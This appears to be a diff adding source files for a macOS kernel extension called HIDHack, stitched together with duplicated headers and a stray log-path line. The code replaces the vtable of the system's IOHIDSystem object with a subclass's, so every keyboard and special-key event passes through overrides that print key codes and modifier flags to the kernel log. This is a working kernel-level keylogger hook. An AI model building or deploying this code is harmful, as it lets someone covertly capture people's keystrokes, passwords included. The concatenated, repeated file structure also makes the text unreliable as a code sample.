@@ -1,0 +1,126 @@
+/var/log/kernel.log
+#include <sys/systm.h>
+#include <mach/mach_types.h>
+
+
+extern int HidHackLoad(void);
+extern int HidHackUnload(void);
+
+
+kern_return_t MacOSSCKEXT_start (kmod_info_t * ki, void * d) {
+    return HidHackLoad() == 0 ? KERN_SUCCESS : KERN_FAILURE;
+}
+
+
+kern_return_t MacOSSCKEXT_stop (kmod_info_t * ki, void * d) {
+    return HidHackUnload() == 0 ? KERN_SUCCESS : KERN_FAILURE;
+}
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+
+#include <mach/mach_types.h>
+#include <sys/systm.h>
+
+ extern int HidHackLoad(void);
+ extern int HidHackUnload(void);
+
+#ifdef __cplusplus
+}
+#endif
+
+#include <IOKit/system.h>
+#include <IOKit/assert.h>
+#include <IOKit/hidsystem/IOHIDSystem.h>
+
+
+class HIDHack : public IOHIDSystem {
+public:
+ virtual void keyboardEvent(unsigned   eventType,
+          /* flags */            unsigned   flags,
+          /* keyCode */          unsigned   key,
+          /* charCode */         unsigned   charCode,
+          /* charSet */          unsigned   charSet,
+          /* originalCharCode */ unsigned   origCharCode,
+          /* originalCharSet */  unsigned   origCharSet,
+          /* keyboardType */     unsigned   keyboardType,
+          /* repeat */           bool       repeat,
+          /* atTime */           AbsoluteTime ts);
+
+ virtual void keyboardSpecialEvent(unsigned   eventType,
+           /* flags */        unsigned   flags,
+           /* keyCode  */     unsigned   key,
+           /* specialty */    unsigned   flavor,
+           /* guid */         UInt64     guid,
+           /* repeat */       bool       repeat,
+           /* atTime */       AbsoluteTime ts);
+};
+
+#include "HIDHack.h"
+
+
+static void *oldVtable = NULL;
+static void *myVtable = NULL;
+
+
+int HidHackLoad(void) {
+ IOHIDSystem *p;
+ HIDHack *sub;
+
+ if (oldVtable != NULL) {
+  printf("###0 KEXT is already loaded\n");
+  return 1;
+ }
+ if (myVtable == NULL) {
+  sub = new HIDHack();
+  myVtable = *(void **)sub;
+  sub->free();
+ }
+    p = IOHIDSystem::instance();
+    oldVtable = *(void **)p;
+    *(void **)p = myVtable;
+
+ printf("###1 KEXT has been successfully loaded\n");
+
+    return 0;
+}
+
+int HidHackUnload(void) {
+ IOHIDSystem *p;
+
+    if (oldVtable != NULL) {
+        p = IOHIDSystem::instance();
+  if (*(void **)p != myVtable) {
+   printf("###2 KEXT is not loaded\n");
+
+   return 1;
+  }
+        *(void **)p = oldVtable;
+        oldVtable = NULL;
+    }
+
+ printf("###3 KEXT has been successfully unloaded\n");
+
+ return 0;
+}
+
+void HIDHack::keyboardEvent(unsigned   eventType, unsigned   flags, unsigned   key, unsigned   charCode, unsigned   charSet, unsigned   origCharCode, unsigned   origCharSet, unsigned   keyboardType, bool repeat,
+       AbsoluteTime ts) {
+ printf("###4 hid event type %d flags 0x%x key %d kbdType %d\n", eventType, flags, key, keyboardType);
+
+    IOHIDSystem::keyboardEvent(eventType, flags, key, charCode, charSet, origCharCode, origCharSet, keyboardType, repeat, ts);
+}
+
+void HIDHack::keyboardSpecialEvent(   unsigned   eventType,
+          /* flags */        unsigned   flags,
+          /* keyCode  */     unsigned   key,
+          /* specialty */    unsigned   flavor,
+          /* guid */         UInt64     guid,
+          /* repeat */       bool       repeat,
+          /* atTime */       AbsoluteTime ts) {
+ printf("###5 special event type %d flags 0x%x key %d flavor %d\n", eventType, flags, key, flavor);
+
+ IOHIDSystem::keyboardSpecialEvent(eventType, flags, key, flavor, guid, repeat, ts);
+}
+
